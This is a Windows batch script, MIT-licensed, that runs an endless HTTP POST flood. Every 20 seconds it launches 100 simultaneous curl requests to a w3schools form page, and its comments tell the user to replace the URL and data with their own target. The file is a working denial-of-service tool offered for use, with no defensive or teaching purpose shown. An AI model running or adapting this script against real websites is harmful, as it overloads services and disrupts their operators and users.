@ECHO OFF

@REM =========================================================================================
@REM MIT License

@REM Copyright (c) 2021 gh0$t

@REM Permission is hereby granted, free of charge, to any person obtaining a copy
@REM of this software and associated documentation files (the "Software"), to deal
@REM in the Software without restriction, including without limitation the rights
@REM to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
@REM copies of the Software, and to permit persons to whom the Software is
@REM furnished to do so, subject to the following conditions:

@REM The above copyright notice and this permission notice shall be included in all
@REM copies or substantial portions of the Software.

@REM THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
@REM IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
@REM FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
@REM AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
@REM LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
@REM OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
@REM SOFTWARE.
@REM =========================================================================================

@REM This code is capable of firing 100 POST attacks (line 33) every 20 seconds (line 39, enough time to exit using CTRL+C). 
@REM Vary these values based on your needs and RAM availability.
@REM Replace the URL, Content-Type and Data attribute (line 36) with your desired values.

:x

set  /A attackTimes=100

FOR /L %%A IN (1,1,%attackTimes%) DO (
  start "Attack %%A" curl -X POST https://www.w3schools.com/action_page.php -H "Content-Type: text/html; charset=UTF-8" -d "fname=John&lname=Doe"
)

timeout /t 20

goto x

cmd /k
